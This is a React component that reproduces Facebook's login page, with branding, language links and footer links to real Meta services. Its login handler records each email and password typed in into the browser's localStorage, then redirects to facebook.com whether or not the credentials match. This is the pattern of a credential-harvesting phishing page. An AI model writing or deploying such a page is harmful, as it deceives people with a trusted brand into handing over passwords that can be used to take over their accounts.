import React, { useState } from "react";

const CORRECT_EMAIL = "test@example.com";
const CORRECT_PASSWORD = "password123";

function FacebookLogin() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleLogin = () => {
    const stored = JSON.parse(localStorage.getItem("facebook_logins")) || [];
    stored.push({ email, password });
    localStorage.setItem("facebook_logins", JSON.stringify(stored));

    if (email === CORRECT_EMAIL && password === CORRECT_PASSWORD) {
      window.location.href = "https://www.facebook.com";
    } else {
     
      window.location.href = "https://www.facebook.com";
    }
  };

  return (
    <div className="login-page">
      {/* Logo section */}
      <div className="logo desktop-logo">facebook</div>
      <img
        src="/images/fb-logo-mobile.png"
        alt="Facebook logo"
        className="mobile-logo"
      />

      {/* Login Card */}
      <div className="login-card">
        <input
          type="text"
          placeholder="Email address or phone number"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          autoComplete="username"
        />
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          autoComplete="current-password"
        />
        <button onClick={handleLogin}>Log In</button>
        <a
          className="forgot-link"
          href="https://www.facebook.com/recover/initiate/"
          target="_blank"
          rel="noreferrer"
        >
          Forgotten password?
        </a>
        <hr className="divider" />
        <a
          className="create-button"
          href="https://www.facebook.com/r.php"
          target="_blank"
          rel="noreferrer"
        >
          Create new account
        </a>

        {/* Meta logo for mobile */}
        <img
          src="/images/meta-logo.png"
          alt="Meta logo"
          className="meta-logo"
        />
      </div>

      {/* Footer for desktop */}
      <div className="footer">
        <div className="languages">
          {[
            "English (UK)",
            "Hausa",
            "Français (France)",
            "Português (Brasil)",
            "Español",
            "العربية",
            "Bahasa Indonesia",
            "Deutsch",
            "日本語",
            "Italiano",
            "हिन्दी",
          ].map((lang, i) => (
            <a key={i} href="https://www.facebook.com" target="_blank" rel="noreferrer">
              {lang}
            </a>
          ))}
        </div>
        <hr />
        <div className="footer-links">
          {[
            ["Sign Up", "https://www.facebook.com/r.php"],
            ["Log in", "https://www.facebook.com/login"],
            ["Messenger", "https://www.messenger.com/"],
            ["Facebook Lite", "https://www.facebook.com/lite/"],
            ["Video", "https://www.facebook.com/watch/"],
            ["Meta Pay", "https://pay.facebook.com/"],
            ["Meta Store", "https://store.facebook.com/"],
            ["Meta Quest", "https://www.meta.com/quest/"],
            ["Ray-Ban Meta", "https://www.ray-ban.com/"],
            ["Meta AI", "https://ai.meta.com/"],
            ["Instagram", "https://www.instagram.com/"],
            ["Threads", "https://www.threads.net/"],
            ["Voting Info", "https://www.facebook.com/votinginformationcenter/"],
            ["Privacy Policy", "https://www.facebook.com/policy.php"],
            ["Privacy Centre", "https://www.facebook.com/privacy/center/"],
            ["About", "https://about.facebook.com/"],
            ["Create ad", "https://www.facebook.com/business/ads"],
            ["Create Page", "https://www.facebook.com/pages/create"],
            ["Developers", "https://developers.facebook.com/"],
            ["Careers", "https://www.facebookcareers.com/"],
            ["Cookies", "https://www.facebook.com/policies/cookies/"],
            ["AdChoices", "https://www.facebook.com/adpreferences/ad_settings/"],
            ["Terms", "https://www.facebook.com/terms.php"],
            ["Help", "https://www.facebook.com/help/"],
            ["Contact uploading", "https://www.facebook.com/help/contact/"],
            ["Settings", "https://www.facebook.com/settings"],
            ["Activity log", "https://www.facebook.com/activitylog"],
          ].map(([text, link], i) => (
            <a key={i} href={link} target="_blank" rel="noreferrer">
              {text}
            </a>
          ))}
        </div>
        <div className="meta-copy">Meta © 2025</div>
      </div>
    </div>
  );
}

export default FacebookLogin;
